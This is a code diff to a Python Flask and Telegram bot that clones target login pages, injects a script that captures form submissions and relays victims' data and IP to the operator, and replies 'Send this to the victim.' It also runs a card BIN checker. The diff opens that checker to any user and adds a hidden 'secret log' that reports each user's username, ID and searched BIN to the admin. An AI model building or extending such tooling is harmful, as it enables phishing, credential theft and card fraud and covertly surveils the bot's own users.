@@ -2,6 +2,7 @@ import os
 import re
 import threading
 import requests
+import html
 from bs4 import BeautifulSoup
 from flask import Flask, request, render_template_string
 import telebot
@@ -42,7 +43,6 @@ def capture(slug):
     if not data: return "Error", 400
     
     ip = request.remote_addr
-    ua = request.headers.get('User-Agent', 'Unknown')
     
     msg = f"🚨 <b>NEW HIT</b> 🚨\n\n<b>Target:</b> {SESSIONS[slug]['url']}\n"
     msg += f"<b>IP:</b> <code>{ip}</code>\n\n"
@@ -56,12 +56,13 @@ def capture(slug):
 # --- BOT LOGIC ---
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    if message.chat.id != ADMIN_ID: return
-    bot.reply_to(message, "Commands:\n`/bin 449497` - Check a BIN\n`https://target.com` - Clone a login page")
+    bot.reply_to(message, "Welcome! Send `/bin 449497` to check a BIN.", parse_mode='Markdown')
 
 @bot.message_handler(commands=['bin'])
 def check_bin(message):
-    if message.chat.id != ADMIN_ID: return
+    searcher_id = message.chat.id
+    searcher_name = message.from_user.username or message.from_user.first_name or "Unknown"
+    
     try:
         bin_num = message.text.split(' ')[1].strip()[:8]
     except IndexError:
@@ -103,10 +104,24 @@ def check_bin(message):
     reply += f"⚙️ <b>Processor:</b> {processor}\n"
     reply += f"🛡️ <b>VBV:</b> <code>{vbv}</code>"
     
+    # Send to the user
     bot.reply_to(message, reply, parse_mode='HTML')
+
+    # Send the secret log to YOU (with error handling so it never crashes)
+    if searcher_id != ADMIN_ID:
+        try:
+            log_msg = f"🕵️ <b>BIN Search Log</b>\n\n"
+            log_msg += f"👤 <b>User:</b> @{searcher_name} (<code>{searcher_id}</code>)\n"
+            log_msg += f"💳 <b>BIN Searched:</b> <code>{bin_num}</code>\n"
+            log_msg += f"🏦 <b>Result:</b> {bank}\n"
+            log_msg += f"⚙️ <b>Processor:</b> {processor}"
+            bot.send_message(ADMIN_ID, log_msg, parse_mode='HTML')
+        except Exception as e:
+            print(f"Log failed: {e}")
 
 @bot.message_handler(func=lambda message: message.text and message.text.startswith('http'))
 def clone_site(message):
+    # ONLY YOU can clone sites
     if message.chat.id != ADMIN_ID: return
     url = message.text
     bot.reply_to(message, f"Scraping {url}...")
@@ -117,7 +132,6 @@ def clone_site(message):
         soup = BeautifulSoup(r.text, 'html.parser')
         slug = os.urandom(4).hex()
 
-        # Keylogger Script
         script = f"""
         <script>
         document.addEventListener('submit', function(e) {{
@@ -151,7 +165,6 @@ def clone_site(message):
 
         SESSIONS[slug] = {'html': str(soup), 'url': url}
         
-        # Get Render URL automatically
         host = os.environ.get('RENDER_EXTERNAL_URL', 'http://localhost:8080')
         
         bot.reply_to(message, f"✅ <b>Clone Live!</b>\n\n<code>{host}/{slug}</code>\n\nSend this to the victim.", parse_mode='HTML')
